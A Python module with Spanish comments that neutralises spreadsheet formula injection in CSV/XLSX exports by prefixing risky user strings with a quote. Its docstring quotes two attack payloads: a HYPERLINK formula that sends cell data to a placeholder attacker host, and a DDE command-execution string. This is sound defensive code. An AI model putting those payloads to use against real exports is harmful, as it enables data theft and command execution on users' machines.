"""Neutralizar la inyección de fórmulas en CSV/XLSX (auditoría 22-11-2026, 02 A39).

Un texto que el usuario escribe (descripción de un gasto, nombre de proyecto,
título de ticket) y que empieza por `=`, `+`, `-`, `@`, tabulador o retorno de
carro se interpreta como FÓRMULA al abrir la exportación en Excel, LibreOffice
o Google Sheets: `=HYPERLINK("https://atacante/?"&A1;"clic")` exfiltra datos y
`=cmd|' /C calc'!A0` (DDE) ejecuta órdenes en equipos sin parchear.

Defensa (OWASP «CSV Injection»): a esos textos se les antepone una comilla
simple, que la hoja muestra como texto literal. Solo se tocan cadenas: los
números (también negativos) siguen siendo números y se pueden sumar.

    from app.core.celdas_seguras import neutralizar_formula, fila_segura
"""
from __future__ import annotations

from typing import Any, Iterable

_INICIOS_PELIGROSOS = ("=", "+", "-", "@", "\t", "\r", "\n", "＝", "＋", "－", "＠")


def neutralizar_formula(valor: Any) -> Any:
    """El valor tal cual, salvo una cadena que una hoja leería como fórmula."""
    if isinstance(valor, str) and valor and valor.lstrip(" ").startswith(_INICIOS_PELIGROSOS):
        return "'" + valor
    return valor


def fila_segura(fila: Iterable[Any]) -> list:
    return [neutralizar_formula(v) for v in fila]


def dict_seguro(fila: dict) -> dict:
    return {k: neutralizar_formula(v) for k, v in fila.items()}
